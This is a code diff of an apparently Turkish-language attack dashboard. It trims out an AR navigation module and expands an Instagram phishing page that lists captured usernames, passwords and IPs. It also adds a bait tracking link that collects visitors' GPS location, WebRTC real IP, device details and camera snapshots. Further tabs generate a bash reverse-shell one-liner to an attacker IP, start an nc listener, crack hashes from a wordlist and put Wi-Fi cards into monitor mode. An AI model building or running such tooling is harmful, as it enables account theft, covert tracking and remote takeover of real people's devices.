@@ -26,7 +26,6 @@ ADMIN_PASS = "toor1"
 SITE_DATABASE = []
 CLICK_LOGS = []
 CREDENTIAL_LOGS = []
-DRIVING_SESSIONS = []
 SCHEDULED_TARGETS = []
 NOTIFY_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")
 
@@ -77,7 +76,7 @@ HTML_TEMPLATE = """
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
         body { background-color: #090d14; color: #e2e8f0; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 15px; }
-        .container { max-width: 1380px; margin: 0 auto; background: #121824; padding: 25px; border-radius: 8px; border: 1px solid #1e293b; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
+        .container { max-width: 1350px; margin: 0 auto; background: #121824; padding: 25px; border-radius: 8px; border: 1px solid #1e293b; box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
         .header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 2px solid #1e293b; padding-bottom: 12px; }
         h1 { color: #38bdf8; margin: 0; font-size: 22px; text-shadow: 0 0 10px rgba(56,189,248,0.3); }
         .logout-btn { background: #991b1b; color: white; padding: 6px 14px; border-radius: 4px; text-decoration: none; font-size: 13px; font-weight: bold; }
@@ -109,23 +108,6 @@ HTML_TEMPLATE = """
         .payload-box { background: #0a0e17; padding: 12px; border-radius: 6px; border: 1px solid #1e293b; margin-bottom: 12px; }
         .dashboard-row { display: flex; gap: 20px; margin-bottom: 20px; flex-wrap: wrap; }
         .dashboard-card { flex: 1; background: #0a0e17; padding: 18px; border-radius: 6px; border: 1px solid #1e293b; text-align: center; min-width: 250px; }
-        
-        /* Gelişmiş AR HUD Stilleri & Auto-Dimming & Yakıt */
-        .ar-container { position: relative; width: 100%; max-width: 750px; margin: 0 auto; background: #000; border-radius: 8px; overflow: hidden; border: 2px solid #38bdf8; box-shadow: 0 0 25px rgba(56,189,248,0.5); transition: 0.3s; }
-        .ar-container:fullscreen { max-width: 100%; width: 100vw; height: 100vh; border: none; border-radius: 0; }
-        #arVideo { width: 100%; height: 450px; object-fit: cover; display: block; filter: brightness(100%) contrast(100%); transition: filter 0.3s; }
-        .ar-container:fullscreen #arVideo { height: 100vh; }
-        #arCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
-        
-        .ar-hud { position: absolute; top: 15px; left: 15px; right: 15px; background: rgba(11, 15, 21, 0.85); border: 1px solid #00ff66; padding: 10px 15px; border-radius: 6px; font-size: 12px; color: #00ff66; z-index: 10; display: flex; justify-content: space-between; align-items: center; transition: background 0.3s, border-color 0.3s; }
-        .ar-weather-hud { position: absolute; top: 75px; right: 15px; background: rgba(11, 15, 21, 0.8); border: 1px solid #38bdf8; padding: 6px 10px; border-radius: 4px; font-size: 11px; color: #38bdf8; z-index: 10; pointer-events: none; }
-        .ar-fuel-hud { position: absolute; top: 75px; left: 15px; background: rgba(11, 15, 21, 0.85); border: 1px solid #facc15; padding: 6px 12px; border-radius: 4px; font-size: 11px; color: #facc15; z-index: 10; font-weight: bold; }
-
-        .ar-controls { background: #0a0e17; padding: 12px; border-radius: 6px; border: 1px solid #1e293b; margin-bottom: 12px; display: flex; gap: 12px; flex-wrap: wrap; align-items: center; }
-        .ar-controls label { color: #e2e8f0; font-size: 12px; cursor: pointer; display: flex; align-items: center; gap: 5px; }
-        .ar-controls input[type="checkbox"] { accent-color: #00ff66; width: 15px; height: 15px; cursor: pointer; }
-        
-        .ar-log-box { background: #05070a; border: 1px solid #38bdf8; border-radius: 6px; padding: 12px; margin-top: 15px; max-height: 160px; overflow-y: auto; font-family: 'Courier New', Courier, monospace; font-size: 12px; color: #38bdf8; }
     </style>
 </head>
 <body>
@@ -138,9 +120,7 @@ HTML_TEMPLATE = """
         <div class="tabs">
             <button class="tab-btn active" onclick="switchTab('scanTab')">🚀 Recon</button>
             <button class="tab-btn" onclick="switchTab('phishTab')">📸 Insta Phishing</button>
-            <button class="tab-btn" onclick="switchTab('lureTab')">🎯 GPS & Tracker</button>
-            <button class="tab-btn" onclick="switchTab('arNavTab')">🧭 AR Navigasyon & HUD</button>
-            <button class="tab-btn" onclick="switchTab('drivingTab')">⛽ Sürüş Raporları & Kara Kutu</button>
+            <button class="tab-btn" onclick="switchTab('lureTab')">🎯 GPS & Intel Tracker</button>
             <button class="tab-btn" onclick="switchTab('crackerTab')">🔑 Hash Cracker</button>
             <button class="tab-btn" onclick="switchTab('shellListenerTab')">💻 Shell Listener</button>
             <button class="tab-btn" onclick="switchTab('telegramTab')">🤖 Telegram</button>
@@ -173,101 +153,65 @@ HTML_TEMPLATE = """
         <!-- Instagram Phishing Sekmesi -->
         <div id="phishTab" class="tab-content">
             <h3>📸 Instagram Phishing & Credential Harvester</h3>
+            <p style="color: #94a3b8; font-size: 13px;">Hedef kullanıcıya atılacak sahte Instagram giriş linkini kopyalayın. Şifreyi girenlerin bilgileri anında panele düşer.</p>
             <div class="form-group"><label>Sahte Instagram Giriş Linki:</label><input type="text" id="instaLink" readonly style="color: #38bdf8;"></div>
             <button class="success" onclick="generateInstaLink()">Link Üret</button>
-            <div id="credsContainer" style="margin-top:15px;"><p style='color: #94a3b8;'>Yakalanan hesap yok.</p></div>
+            <h4 style="margin-top: 25px;">🎯 Yakalanan Instagram Hesap Bilgileri:</h4>
+            <div id="credsContainer"><p style='color: #94a3b8;'>Henüz yakalanan hesap yok.</p></div>
         </div>
 
         <!-- Lure Link & Tracker Sekmesi -->
         <div id="lureTab" class="tab-content">
             <h3>🎯 Gelişmiş GPS & Cihaz İstihbarat Tracker</h3>
-            <button class="success" onclick="generateLureLink()">Takip Linki Üret</button>
-            <div class="form-group" style="margin-top: 15px;"><input type="text" id="generatedLink" readonly style="color: #38bdf8;"></div>
-            <div id="clickLogsContainer" style="margin-top:15px;"><p style='color: #94a3b8;'>Veri yok.</p></div>
+            <div class="form-group"><label>Kampanya Başlığı:</label><input type="text" id="lureTitle" value="Özel Güvenlik Raporu ve Ödül Doğrulama"></div>
+            <button class="success" onclick="generateLureLink()">Gelişmiş Takip Linki Üret</button>
+            <div class="form-group" style="margin-top: 20px;"><label>Oluşturulan Takip Linki:</label><input type="text" id="generatedLink" readonly style="color: #38bdf8;"></div>
+            <h4 style="margin-top: 25px;">🔗 Yakalanan Ziyaretçi & Cihaz İstihbaratı:</h4>
+            <div id="clickLogsContainer"><p style='color: #94a3b8;'>Henüz veri yakalanmadı.</p></div>
         </div>
 
-        <!-- AR Navigasyon & Taktiksel HUD Modülü -->
-        <div id="arNavTab" class="tab-content">
-            <h3>🧭 Ultimate AR Navigasyon, Auto-Dimming, Yakıt & ETA Takibi</h3>
-            <p style="color: #94a3b8; font-size: 13px;">Gece karartma, yakıt/menzil simülasyonu, şerit takip ve sürüş kara kutusu entegre çalışır.</p>
-            
-            <div class="ar-controls">
-                <span style="color:#38bdf8; font-weight:bold;">Modül Kontrolleri:</span>
-                <label><input type="checkbox" id="chkAutoDim" checked> 🌙 Auto-Dimming (Gece Karartma)</label>
-                <label><input type="checkbox" id="chkLane" checked> 🚧 Şerit Takip Asistanı</label>
-                <label><input type="checkbox" id="chkNightVision"> 🔦 Gece Görüşü / Termal</label>
-                <label><input type="checkbox" id="chkCompass"> Jiroskop & Pusula</label>
-                <label><input type="checkbox" id="chkSpatial" checked> Sesli Asistan</label>
-            </div>
-
-            <div class="form-group">
-                <label>Hedef Operasyon / Rota:</label>
-                <input type="text" id="arDestination" value="Saha Bölge Komuta Merkezi B-2">
-            </div>
-            
-            <div style="display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap;">
-                <button class="success" onclick="startARCamera()">📸 AR Kamerayı Başlat</button>
-                <button class="success" onclick="finishDrivingSession()">🏁 Sürüşü Bitir & Rapor Al</button>
-                <button class="secondary" onclick="toggleFullScreen()">📺 Tam Ekran</button>
-                <button class="success" onclick="takeSnapshot()">📷 Kanıt Al</button>
-                <button class="danger" onclick="stopARCamera()">🛑 Kapat</button>
-            </div>
-
-            <div class="ar-container" id="arBox">
-                <div class="ar-hud" id="arHudBox">
-                    <span id="arHudText">Durum: Hazır</span>
-                    <span id="arTelemetry" style="color: #38bdf8;">HIZ: 0 km/s | ETA: --</span>
-                </div>
-                <div id="arFuelHud" class="ar-fuel-hud">⛽ Yakıt: %85 | Menzil: 240 km</div>
-                <div id="arWeatherWidget" class="ar-weather-hud">⛅ 22°C | Grip: %92</div>
-                
-                <video id="arVideo" autoplay playsinline muted></video>
-                <canvas id="arCanvas"></canvas>
-            </div>
-
-            <h4 style="margin-top: 20px; color: #38bdf8;">📋 Canlı Taktiksel Log Akışı & Kara Kutu Kayıtları:</h4>
-            <div id="arLogTerminal" class="ar-log-box">[00:00:00] Sürüş kara kutusu başlatıldı. Tüm veriler loglanıyor...</div>
-        </div>
-
-        <!-- Sürüş Raporları & Kara Kutu Sekmesi -->
-        <div id="drivingTab" class="tab-content">
-            <h3>⛽ Sürüş Raporları & Kara Kutu (Blackbox) Arşivi</h3>
-            <p style="color: #94a3b8; font-size: 13px;">AR ekranında "Sürüşü Bitir & Rapor Al" butonuna bastığında oluşturulan detaylı sürüş raporlarını ve yakıt/menzil analizlerini buradan indirebilirsin.</p>
-            <div id="drivingReportsContainer">
-                <p style='color:#94a3b8;'>Henüz kaydedilmiş bir sürüş raporu yok. AR Navigasyon sekmesinden sürüşü başlatıp bitirebilirsiniz.</p>
-            </div>
-        </div>
-
-        <!-- Diğer Standart Sekmeler -->
+        <!-- Hash Cracker Sekmesi -->
         <div id="crackerTab" class="tab-content">
-            <h3>🔑 Hash Cracker</h3>
-            <div class="form-group"><select id="hashType"><option value="md5">MD5</option><option value="sha256">SHA-256</option></select></div>
-            <div class="form-group"><input type="text" id="targetHash" placeholder="Hash giriniz"></div>
-            <div class="form-group"><textarea id="wordlistArea">admin\n123456\nroot1\ntoor1\nsecret</textarea></div>
-            <button class="danger" onclick="startHashCrack()">Hash Çöz</button>
+            <h3>🔑 Hash Cracker & Şifre Çözücü</h3>
+            <div class="form-group"><label>Hash Tipi:</label><select id="hashType"><option value="md5">MD5</option><option value="sha256">SHA-256</option></select></div>
+            <div class="form-group"><label>Hedef Hash:</label><input type="text" id="targetHash" placeholder="örn: 5d41402abc4b2a76b9719d911017c592"></div>
+            <div class="form-group"><label>Wordlist (Her satıra bir şifre):</label><textarea id="wordlistArea">admin\n123456\npassword\nroot1\ntoor1\nhello\nsecret\nkali</textarea></div>
+            <button class="danger" onclick="startHashCrack()">Hash Çözmeyi Başlat</button>
             <div id="crackResults" class="terminal" style="display:none; margin-top:15px;"></div>
         </div>
 
+        <!-- Shell Listener Sekmesi -->
         <div id="shellListenerTab" class="tab-content">
-            <h3>💻 Reverse Shell Dinleyicisi</h3>
-            <div class="form-group"><input type="number" id="listenerPort" value="4444"></div>
+            <h3>💻 Reverse Shell Dinleyicisi (Multi-Handler)</h3>
+            <p style="color: #94a3b8; font-size: 13px;">Sunucu üzerinde belirtilen portu dinlemeye alarak gelen reverse shell bağlantılarını yönetin.</p>
+            <div class="form-group"><label>Dinlenecek Port (LPORT):</label><input type="number" id="listenerPort" value="4444"></div>
             <button class="success" onclick="startListener()">Dinlemeyi Başlat</button>
             <div id="listenerStatus" class="terminal" style="display:none; margin-top:15px;"></div>
         </div>
 
+        <!-- Telegram Test Sekmesi -->
         <div id="telegramTab" class="tab-content">
-            <h3>🤖 Telegram Bot Tester</h3>
-            <div class="form-group"><input type="text" id="testChatId" value="{{ default_chat_id }}"></div>
-            <button class="success" onclick="sendTelegramTest()">Test Gönder</button>
-            <div id="telegramTestStatus" class="terminal" style="display:none; margin-top:15px;"></div>
+            <h3>🤖 Telegram Bot Notification Tester</h3>
+            <div class="form-group"><label>Telegram Chat ID:</label><input type="text" id="testChatId" value="{{ default_chat_id }}" placeholder="örn: 123456789"></div>
+            <button class="success" onclick="sendTelegramTest()">🚀 Test Mesajı Gönder</button>
+            <div id="telegramTestStatus" class="terminal" style="display:none; margin-top: 15px;"></div>
         </div>
 
+        <!-- Wi-Fi Denetim Sekmesi -->
         <div id="wifiTab" class="tab-content">
-            <h3>📶 Wi-Fi Audit</h3>
-            <button class="success" onclick="runWifiAction('scan')">Ağları Tara</button>
-            <div id="wifiResults" class="terminal" style="display:none; margin-top:15px;"></div>
+            <h3>📶 Real Wi-Fi Audit & Interface Controller</h3>
+            <div class="form-group"><label>Wireless Interface:</label><input type="text" id="wifiInterface" value="wlan0"></div>
+            <div class="form-group"><label>Hedef BSSID / MAC:</label><input type="text" id="wifiBssid" placeholder="AA:BB:CC:DD:EE:FF"></div>
+            <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+                <button class="secondary" onclick="runWifiAction('interfaces')">Interface Listele</button>
+                <button class="danger" onclick="runWifiAction('monitor')">Monitor Mode Aç</button>
+                <button class="success" onclick="runWifiAction('scan')">Ağları Tara</button>
+            </div>
+            <div id="wifiStatus" class="loading" style="margin-top: 15px;"></div>
+            <div id="wifiResults" class="terminal" style="display:none;"></div>
         </div>
 
+        <!-- Diğer Sekmeler -->
         <div id="niktoTab" class="tab-content">
             <h3>Nikto Web Vulnerability Scanner</h3>
             <div class="form-group"><label>Target URL:</label><input type="text" id="niktoTarget" placeholder="https://example.com"></div>
@@ -351,256 +295,108 @@ HTML_TEMPLATE = """
 
     <script>
         let currentReportText = "", lastTarget = "", gradeChartInstance = null, wafChartInstance = null;
-        let arStream = null, arInterval = null, compassHeading = 0, deviceBeta = 0;
-        let currentDistance = 150, currentSpeed = 35, fuelLevel = 85, drivingRange = 240;
-        let sessionLogs = [], lastSpokenTime = 0, lastLaneWarningTime = 0;
-
         function switchTab(tabId) {
             document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
             document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
             document.getElementById(tabId).classList.add('active');
             event.target.classList.add('active');
-            if(tabId === 'drivingTab') loadDrivingReports();
             if(tabId === 'dataTab' || tabId === 'lootingTab') loadSiteDatabase();
             if(tabId === 'lureTab') loadClickLogs();
             if(tabId === 'phishTab') loadCreds();
-            if(tabId !== 'arNavTab') stopARCamera();
         }
-
-        function handleOrientation(event) {
-            if (event.alpha !== null) compassHeading = Math.round(event.alpha);
-            if (event.beta !== null) deviceBeta = Math.round(event.beta);
+        function generateInstaLink() {
+            document.getElementById('instaLink').value = window.location.origin + "/phish/instagram";
+            alert("Instagram phishing linki üretildi!");
         }
-
-        function speakSpatial(text, force = false) {
-            let useSpatial = document.getElementById('chkSpatial').checked;
-            let now = Date.now();
-            if (!useSpatial || (!force && (now - lastSpokenTime < 10000))) return;
-            if ('speechSynthesis' in window) {
-                window.speechSynthesis.cancel();
-                let utterance = new SpeechSynthesisUtterance(text);
-                utterance.lang = 'tr-TR';
-                utterance.rate = 1.0;
-                window.speechSynthesis.speak(utterance);
-                lastSpokenTime = now;
-            }
-        }
-
-        function playThreatBeep() {
-            try {
-                let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                let osc = audioCtx.createOscillator();
-                let gain = audioCtx.createGain();
-                osc.type = 'sine';
-                osc.frequency.setValueAtTime(750, audioCtx.currentTime);
-                gain.gain.setValueAtTime(0.05, audioCtx.currentTime);
-                gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.15);
-                osc.connect(gain);
-                gain.connect(audioCtx.destination);
-                osc.start();
-                osc.stop(audioCtx.currentTime + 0.15);
-            } catch(e) {}
-        }
-
-        function toggleFullScreen() {
-            let elem = document.getElementById('arBox');
-            if (!document.fullscreenElement) {
-                if (elem.requestFullscreen) elem.requestFullscreen();
-            } else {
-                if (document.exitFullscreen) document.exitFullscreen();
-            }
-        }
-
-        function takeSnapshot() {
-            let video = document.getElementById('arVideo');
-            let canvas = document.getElementById('arCanvas');
-            if (!video.srcObject) { alert("Kamera açık değil!"); return; }
-            let snapCanvas = document.createElement('canvas');
-            snapCanvas.width = video.videoWidth || 640;
-            snapCanvas.height = video.videoHeight || 480;
-            let sCtx = snapCanvas.getContext('2d');
-            sCtx.drawImage(video, 0, 0, snapCanvas.width, snapCanvas.height);
-            sCtx.drawImage(canvas, 0, 0, snapCanvas.width, snapCanvas.height);
-
-            let a = document.createElement('a');
-            a.href = snapCanvas.toDataURL('image/png');
-            a.download = `AR_TACTICAL_PROOF_${Date.now()}.png`;
-            a.click();
-            speakSpatial("Kanıt görüntüsü kaydedildi.", true);
-        }
-
-        // --- AR MOTORU: AUTO-DIMMING, YAKIT & ETA ENTEGRELİ ---
-        async function startARCamera() {
-            let video = document.getElementById('arVideo');
-            let hud = document.getElementById('arHudText');
-            let telemetry = document.getElementById('arTelemetry');
-            let fuelHud = document.getElementById('arFuelHud');
-            let hudBox = document.getElementById('arHudBox');
-            let canvas = document.getElementById('arCanvas');
-            let logTerminal = document.getElementById('arLogTerminal');
-            let dest = document.getElementById('arDestination').value || 'Hedef';
-
-            sessionLogs = [];
-            fuelLevel = 85;
-            drivingRange = 240;
-            currentDistance = 150;
-
-            window.addEventListener('deviceorientation', handleOrientation, true);
-
-            try {
-                arStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false });
-            } catch (err) {
-                try { arStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false }); } 
-                catch (e) { alert("Kamera erişimi sağlanamadı!"); return; }
-            }
-
-            video.srcObject = arStream;
-            hud.innerText = "HUD Aktif: Rota Çiziliyor";
-            speakSpatial("AR Navigasyon ve yakıt takibi başlatıldı.", true);
-
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            let ctx = canvas.getContext('2d');
-
-            let step = 0;
-            arInterval = setInterval(() => {
-                ctx.clearRect(0, 0, canvas.width, canvas.height);
-                let w = canvas.width;
-                let h = canvas.height;
-
-                // 1. 🌙 Auto-Dimming (Akıllı Gece / Gündüz Karartma Modu)
-                let useAutoDim = document.getElementById('chkAutoDim').checked;
-                let currentHour = new Date().getHours();
-                let isNight = currentHour >= 20 || currentHour < 6;
-
-                if (useAutoDim && isNight) {
-                    video.style.filter = "brightness(65%) contrast(120%)";
-                    hudBox.style.background = "rgba(5, 7, 10, 0.95)";
-                    hudBox.style.borderColor = "#15803d";
-                } else {
-                    video.style.filter = "brightness(100%) contrast(100%)";
-                    hudBox.style.background = "rgba(11, 15, 21, 0.85)";
-                    hudBox.style.borderColor = "#00ff66";
-                }
-
-                // 2. Şerit Takip Asistanı
-                let useLane = document.getElementById('chkLane').checked;
-                let isLaneViolated = false;
-                if (useLane) {
-                    ctx.strokeStyle = 'rgba(0, 255, 102, 0.5)';
-                    ctx.lineWidth = 3;
-                    ctx.setLineDash([15, 10]);
-                    ctx.beginPath(); ctx.moveTo(w * 0.25, h); ctx.lineTo(w * 0.42, h * 0.48); ctx.stroke();
-                    ctx.beginPath(); ctx.moveTo(w * 0.75, h); ctx.lineTo(w * 0.58, h * 0.48); ctx.stroke();
-                    ctx.setLineDash([]);
-
-                    if (Math.abs(deviceBeta) > 25) { isLaneViolated = true; }
-                }
-
-                let timestamp = new Date().toLocaleTimeString();
-                if (useLane && isLaneViolated) {
-                    let now = Date.now();
-                    ctx.strokeStyle = '#ef4444'; ctx.lineWidth = 4;
-                    ctx.strokeRect(10, 10, w - 20, h - 20);
-                    hud.innerText = "⚠️ DİKKAT: Şeritten Sapma!";
-                    if (now - lastLaneWarningTime > 6000) {
-                        lastLaneWarningTime = now;
-                        playThreatBeep();
-                        speakSpatial("Şerit ihlali!", true);
-                        sessionLogs.push(`[${timestamp}] ⚠️ ŞERİT İHLALİ ALGILANDI`);
-                    }
-                }
-
-                // Holografik Yol Çizgisi
-                let centerX = (w / 2);
-                let bottomY = h, horizonY = h * 0.48;
-
-                ctx.beginPath();
-                ctx.moveTo(centerX - 60, bottomY); ctx.lineTo(centerX + 60, bottomY);
-                for (let y = bottomY; y >= horizonY; y -= 10) {
-                    let wave = Math.sin((y + step * 6) * 0.03) * 10;
-                    let factor = (bottomY - y) / (bottomY - horizonY);
-                    let curW = 60 * (1 - factor * 0.8);
-                    ctx.lineTo(centerX + wave + curW, y);
-                }
-                for (let y = horizonY; y <= bottomY; y += 10) {
-                    let wave = Math.sin((y + step * 6) * 0.03) * 10;
-                    let factor = (bottomY - y) / (bottomY - horizonY);
-                    let curW = 60 * (1 - factor * 0.8);
-                    ctx.lineTo(centerX + wave - curW, y);
-                }
-                ctx.closePath();
-                let trailGrad = ctx.createLinearGradient(0, horizonY, 0, bottomY);
-                trailGrad.addColorStop(0, 'rgba(0, 255, 102, 0.05)');
-                trailGrad.addColorStop(1, 'rgba(0, 255, 102, 0.8)');
-                ctx.fillStyle = trailGrad;
-                ctx.fill();
-
-                // ⛽ Yakıt, Menzil & ETA (Varış Süresi) Güncelleme
-                if (step % 50 === 0) {
-                    if (currentDistance > 3) {
-                        currentDistance -= 3;
-                        if(fuelLevel > 5) fuelLevel -= 0.2;
-                        if(drivingRange > 10) drivingRange -= 1;
-                    }
-                    let etaMinutes = Math.ceil(currentDistance / 35);
-                    telemetry.innerText = `HIZ: ${currentSpeed} km/s | ETA: ${etaMinutes} dk | Kalan: ${currentDistance}m`;
-                    fuelHud.innerText = `⛽ Yakıt: %${Math.round(fuelLevel)} | Menzil: ${drivingRange} km`;
-                }
-
-                // Canlı log kaydı
-                if (step % 40 === 0) {
-                    let logStr = `[${timestamp}] Hız: ${currentSpeed} km/s | Yakıt: %${Math.round(fuelLevel)} | Kalan Mesafe: ${currentDistance}m`;
-                    sessionLogs.push(logStr);
-                    logTerminal.innerHTML += `<br>` + logStr;
-                    logTerminal.scrollTop = logTerminal.scrollHeight;
-                }
-
-                step++;
-            }, 80);
-        }
-
-        function stopARCamera() {
-            if (arStream) { arStream.getTracks().forEach(t => t.stop()); arStream = null; }
-            if (arInterval) { clearInterval(arInterval); arInterval = null; }
-            window.removeEventListener('deviceorientation', handleOrientation, true);
-            let video = document.getElementById('arVideo');
-            video.srcObject = null;
-            video.style.filter = "none";
-            document.getElementById('arHudText').innerText = "Durum: Kapalı";
-        }
-
-        // --- SÜRÜŞ RAPORLARI & KARA KUTU KAYDETME ---
-        async function finishDrivingSession() {
-            stopARCamera();
-            if(sessionLogs.length === 0) { alert("Kaydedilmiş sürüş verisi bulunamadı!"); return; }
-            let sessionData = {
-                time: new Date().toLocaleString(),
-                logs: sessionLogs
-            };
-            let res = await fetch('/api/driving/save', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(sessionData) });
+        async function loadCreds() {
+            let res = await fetch('/api/phish/creds');
             let data = await res.json();
-            alert("Sürüş başarıyla tamamlandı! 'Sürüş Raporları' sekmesinden kara kutu raporunu indirebilirsin.");
-            switchTab('drivingTab');
-        }
-
-        async function loadDrivingReports() {
-            let res = await fetch('/api/driving/reports');
-            let data = await res.json();
-            let container = document.getElementById('drivingReportsContainer');
-            if(data.reports.length === 0) { container.innerHTML = "<p style='color:#94a3b8;'>Henüz kaydedilmiş rapor yok.</p>"; return; }
-            let html = `<table><thead><tr><th>Tarih & Saat</th><th>Telemetri Satır Sayısı</th><th>Kara Kutu Dosyası</th></tr></thead><tbody>`;
-            data.reports.forEach((r, idx) => {
-                html += `<tr><td>${r.time}</td><td>${r.logs.length} satır kayıt</td><td><a href="/api/driving/download?index=${idx}" target="_blank"><button class="success">📥 Raporu İndir (.TXT)</button></a></td></tr>`;
-            });
+            let container = document.getElementById('credsContainer');
+            if(data.creds.length === 0) { container.innerHTML = "<p style='color: #94a3b8;'>Henüz yakalanan hesap yok.</p>"; return; }
+            let html = `<table><thead><tr><th>Zaman</th><th>IP Adresi</th><th>Kullanıcı Adı / E-Posta</th><th>Şifre</th></tr></thead><tbody>`;
+            data.creds.forEach(c => { html += `<tr><td>${c.time}</td><td><b>${c.ip}</b></td><td style="color:#38bdf8;">${c.username}</td><td style="color:#f87171;">${c.password}</td></tr>`; });
             html += `</tbody></table>`;
             container.innerHTML = html;
         }
-
-        // Standart fonksiyonlar
+        function generatePayloads() {
+            let ip = document.getElementById('attackerIp').value || '10.0.0.1', port = document.getElementById('attackerPort').value || '4444';
+            document.getElementById('bashPayload').innerText = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
+        }
+        function generateLureLink() {
+            let randomId = Math.random().toString(36).substring(2, 9);
+            document.getElementById('generatedLink').value = window.location.origin + "/track/" + randomId;
+            alert("Gelişmiş Takip linki üretildi!");
+        }
+        async function loadClickLogs() {
+            let res = await fetch('/api/lure/logs');
+            let data = await res.json();
+            let container = document.getElementById('clickLogsContainer');
+            if(data.logs.length === 0) { container.innerHTML = "<p style='color: #94a3b8;'>Henüz veri yakalanmadı.</p>"; return; }
+            let html = `<table><thead><tr><th>Zaman & IP</th><th>Cihaz & İstihbarat (RAM/CPU/Pil)</th><th>WebRTC Gerçek IP</th><th>📍 GPS Harita</th><th>📸 Snapshot</th></tr></thead><tbody>`;
+            data.logs.forEach((l, index) => { 
+                let mapId = `map_${index}`;
+                let locContent = l.lat ? `<div id="${mapId}" class="mini-map"></div><br><a href="https://maps.google.com/?q=${l.lat},${l.lon}" target="_blank" style="color:#38bdf8; font-size:11px;">Google Maps</a>` : "Konum İzni Yok";
+                let snapContent = l.snapshot ? `<img src="${l.snapshot}" class="snapshot-img">` : "Yok";
+                let specs = `OS: <b>${l.os}</b><br>RAM: ${l.ram} GB | Çekirdek: ${l.cores}<br>Pil: <b>${l.battery}</b><br>Ekran: ${l.screen}`;
+                html += `<tr><td>${l.time}<br><b>${l.ip}</b></td><td>${specs}</td><td style="color:#38bdf8;">${l.webrtc_ip || 'Tespit Edilemedi'}</td><td>${locContent}</td><td>${snapContent}</td></tr>`; 
+            });
+            html += `</tbody></table>`;
+            container.innerHTML = html;
+            data.logs.forEach((l, index) => {
+                if(l.lat && l.lon) {
+                    let mapId = `map_${index}`;
+                    setTimeout(() => {
+                        let map = L.map(mapId, {attributionControl: false, zoomControl: false}).setView([l.lat, l.lon], 14);
+                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+                        L.marker([l.lat, l.lon]).addTo(map).bindPopup("📍 Hedef Konum").openPopup();
+                    }, 100);
+                }
+            });
+        }
+        async function startHashCrack() {
+            let type = document.getElementById('hashType').value;
+            let targetHash = document.getElementById('targetHash').value.trim();
+            let wordlist = document.getElementById('wordlistArea').value;
+            let resultsDiv = document.getElementById('crackResults');
+            if(!targetHash) { alert('Hash giriniz!'); return; }
+            resultsDiv.style.display = "block";
+            resultsDiv.innerHTML = "root@kali:~# Hash brute-force / cracking başlatıldı...";
+            let res = await fetch('/api/crack-hash', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({type, hash: targetHash, wordlist}) });
+            let data = await res.json();
+            resultsDiv.innerHTML = data.output;
+        }
+        async function startListener() {
+            let port = document.getElementById('listenerPort').value;
+            let statusDiv = document.getElementById('listenerStatus');
+            statusDiv.style.display = "block";
+            statusDiv.innerHTML = `root@kali:~# nc -lvnp ${port} dinlemesi başlatılıyor...`;
+            let res = await fetch('/api/listener/start', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({port}) });
+            let data = await res.json();
+            statusDiv.innerHTML = data.output;
+        }
+        async function sendTelegramTest() {
+            let chatId = document.getElementById('testChatId').value.trim();
+            let statusDiv = document.getElementById('telegramTestStatus');
+            if(!chatId) { alert('Chat ID giriniz!'); return; }
+            statusDiv.style.display = "block";
+            statusDiv.innerHTML = "root@kali:~# Telegram test mesajı gönderiliyor...";
+            let res = await fetch('/api/telegram-test', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: chatId}) });
+            let data = await res.json();
+            statusDiv.innerHTML = data.output;
+        }
+        async function runWifiAction(action) {
+            let iface = document.getElementById('wifiInterface').value.trim();
+            let bssid = document.getElementById('wifiBssid').value.trim();
+            let statusDiv = document.getElementById('wifiStatus'), resultsDiv = document.getElementById('wifiResults');
+            statusDiv.innerHTML = `root@kali:~# running wifi action [${action}] on ${iface}...`; resultsDiv.style.display = "none";
+            let res = await fetch('/api/wifi-audit', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action, iface, bssid}) });
+            let data = await res.json();
+            statusDiv.innerHTML = ""; resultsDiv.style.display = "block"; resultsDiv.innerHTML = data.output;
+        }
         async function startScan(targetOverride = false) {
             let url = targetOverride ? targetOverride : document.getElementById('targetUrl').value.trim();
             if(!url) { alert('Specify target!'); return; }
+            if(targetOverride) { document.getElementById('targetUrl').value = url; switchTab('scanTab'); }
             lastTarget = url;
             let statusDiv = document.getElementById('status'), resultsDiv = document.getElementById('results');
             statusDiv.innerHTML = `root@kali:~# scanning ${url}...`; resultsDiv.style.display = "none";
@@ -608,35 +404,63 @@ HTML_TEMPLATE = """
             let data = await res.json();
             statusDiv.innerHTML = ""; resultsDiv.style.display = "block"; resultsDiv.innerHTML = data.report; currentReportText = data.report; document.getElementById('actionButtons').style.display = "flex";
         }
-        function generateInstaLink() { document.getElementById('instaLink').value = window.location.origin + "/phish/instagram"; alert("Link üretildi!"); }
-        function generateLureLink() { document.getElementById('generatedLink').value = window.location.origin + "/track/" + Math.random().toString(36).substring(2,9); alert("Takip linki üretildi!"); }
-        async function startHashCrack() {
-            let type = document.getElementById('hashType').value, hash = document.getElementById('targetHash').value, wordlist = document.getElementById('wordlistArea').value;
-            let res = await fetch('/api/crack-hash', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({type, hash, wordlist}) });
-            let data = await res.json(); let el = document.getElementById('crackResults'); el.style.display="block"; el.innerHTML = data.output;
+        async function startNiktoScan() {
+            let url = document.getElementById('niktoTarget').value.trim();
